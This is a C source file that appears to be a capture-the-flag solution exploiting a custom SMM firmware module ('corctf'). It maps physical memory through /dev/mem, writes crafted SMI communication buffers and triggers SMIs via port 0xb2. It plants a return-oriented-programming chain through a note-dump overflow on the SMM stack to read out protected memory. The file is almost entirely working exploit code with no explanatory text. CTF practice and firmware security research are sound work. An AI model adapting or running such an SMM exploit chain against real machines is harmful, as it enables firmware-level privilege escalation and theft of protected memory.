#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include "corctf.h"
#include <sys/io.h>

int memFd;

size_t smmc_startAddr,smmc_endAddr,smmc_addrSize;
size_t acpinv_startAddr,acpinv_endAddr,acpinv_addrSize;
SMM_CORE_PRIVATE_DATA *smmc;
EFI_MM_COMMUNICATE *CommBuffer;

GUID gEfiSmmCorctfProtocolGuid             = {0xb888a84d, 0x3888, 0x480e, {0x95, 0x83, 0x81, 0x37, 0x25, 0xfd, 0x39, 0x8b}};
void readSmmcAddr(){
    FILE *fp = fopen("/sys/firmware/memmap/4/start","r");
    if(fp == NULL){
        printf("open start failed\n");
        exit(0);
    }
    fscanf(fp,"%llx",&smmc_startAddr);
    fclose(fp);
    fp = fopen("/sys/firmware/memmap/4/end","r");
    if(fp == NULL){
        printf("open end failed\n");
        exit(0);
    }
    fscanf(fp,"%llx",&smmc_endAddr);
    fclose(fp);
    smmc_addrSize = smmc_endAddr-smmc_startAddr+1;
    printf("SMMC: startAddr %p endAddr %p addrSize %p\n",smmc_startAddr,smmc_endAddr,smmc_addrSize);
}

void readAcpiNvAddr(){
    FILE *fp = fopen("/sys/firmware/memmap/7/start","r");
    if(fp == NULL){
        printf("open start failed\n");
        exit(0);
    }
    fscanf(fp,"%llx",&acpinv_startAddr);
    fclose(fp);
    fp = fopen("/sys/firmware/memmap/7/end","r");
    if(fp == NULL){
        printf("open end failed\n");
        exit(0);
    }
    fscanf(fp,"%llx",&acpinv_endAddr);
    fclose(fp);
    acpinv_addrSize = acpinv_endAddr-acpinv_startAddr+1;
    printf("AcpiNv: startAddr %p endAddr %p addrSize %p\n",acpinv_startAddr,acpinv_endAddr,acpinv_addrSize);
}

void openMem(){
    memFd = open("/dev/mem", O_RDWR | O_SYNC);
    if(memFd == -1){
        printf("open /dev/mem failed\n");
        exit(0);
    }
    printf("open /dev/mem success\n");
}

void *phyAddr_to_virtAddr(size_t addr, size_t size){
    void *start = (char *)mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, memFd, addr);
    if(start == MAP_FAILED){
        printf("phyAddr %p size %p mmap failed\n",addr,size);
        exit(0);
    }
    printf("phyAddr %p to virtAddr %p size %p\n", addr, start, size);
    return start;
}

void hexdump(void *buf, size_t size){
    for(int i = 0;i < size;){
        printf("%04x:", i);
        for(int j = 0;j < 0x10;j++){
            printf("%02x ",((unsigned char *)buf)[i++]);
        }
        printf("\n");   
    }
}


void makeBuffer(GUID guid,void *ptr,size_t size){
    smmc->CommunicationBuffer = smmc_startAddr+0x1e0000+0x500;
    CommBuffer->HeaderGuid = guid;
    CommBuffer->MessageLength = size;
    memcpy(CommBuffer->Data,ptr,size);
    smmc->BufferSize = size+0x18;
    printf("CommunicationBuffer %p\n",smmc->CommunicationBuffer);
}

void add(int idx,char *note){
    printf("add idx %p\n",idx);
    COMM_DATA Cmd;
    Cmd.Cmd = ADD_NOTE;
    Cmd.Idx = idx;
    memcpy(&Cmd.Data.Note,note,0x10);
    makeBuffer(gEfiSmmCorctfProtocolGuid,&Cmd,sizeof(Cmd));
    outb(0,0xb2);
}

DIARY_NOTE get(int idx){
    printf("get idx %p\n",idx);
    COMM_DATA Cmd;
    Cmd.Cmd = GET_NOTE;
    Cmd.Idx = idx;
    makeBuffer(gEfiSmmCorctfProtocolGuid,&Cmd,sizeof(Cmd));
    outb(0,0xb2);
    memcpy(&Cmd,CommBuffer->Data,sizeof(Cmd));
    return Cmd.Data.Note;
}

void dump_notes(size_t dest){
    printf("dump dest %p\n",dest);  
    COMM_DATA Cmd;
    Cmd.Cmd = DUMP_NOTES;
    Cmd.Data.Dest = dest;
    makeBuffer(gEfiSmmCorctfProtocolGuid,&Cmd,sizeof(Cmd));

    outb(0,0xb2);
}

void debug(){
    printf("[+]DEBUG\n");
    getchar();
}

size_t rop[0x100];
size_t ropIdx = 0;

int main(){
    openMem();
    readSmmcAddr();
    readAcpiNvAddr();
    void *ptr;
    ptr = phyAddr_to_virtAddr(smmc_startAddr+0x1e0000,0x1000);
    smmc = ptr+0x380;
    smmc->CommunicationBuffer = smmc_startAddr+0x1e0000+0x500;
    CommBuffer = ptr+0x500;
    printf("smmc %p\n",smmc);
    printf("entry %p\n",smmc->SmmEntryPoint);
    iopl(3);
    getchar();
    size_t stackAddr = 0x7ffb6ae8;
    size_t base = 0x0007FF9C000;
    size_t rsm = 0x7ffb728f;
    size_t *p = (void *)CommBuffer + 0x100 + 0x50;
    *p = base + 0x0000000000001b62;                     //pop rdi; ret;
    rop[ropIdx++] = base + 0x000000000000237c;          //pop rax; pop rbx; pop r12; pop r13; pop r14; ret;
    rop[ropIdx++] = smmc->CommunicationBuffer + 0x100;  //rax
    rop[ropIdx++] = 0x100;                              //rbx
    rop[ropIdx++] = 0;                                  //r12
    rop[ropIdx++] = 0;                                  //r13
    rop[ropIdx++] = 0;                                  //r14
    rop[ropIdx++] = base + 0x00000000000021d4;          //mov r8, rbx; mov ecx, 6; call qword ptr [rax + 0x50];
    rop[ropIdx++] = base + 0x000000000000258c;          //pop rdx ; pop rcx; pop rbx; ret;
    rop[ropIdx++] = base + 0x2BBC;                      //rdx
    rop[ropIdx++] = smmc->CommunicationBuffer + 0x100;  //rcx
    rop[ropIdx++] = 0;                                  //rbx
    rop[ropIdx++] = base + 0x2510;                      //copy mem
    rop[ropIdx++] = rsm;                                //rsm 
    for(int i = 0;i < ropIdx;i += 2){
        add(i/2,(char *)&rop[i]);
    }
    debug();
    dump_notes(stackAddr);
    p = (void *)CommBuffer + 0x100;
    printf("flag :%s\n",p);
    return 0;
}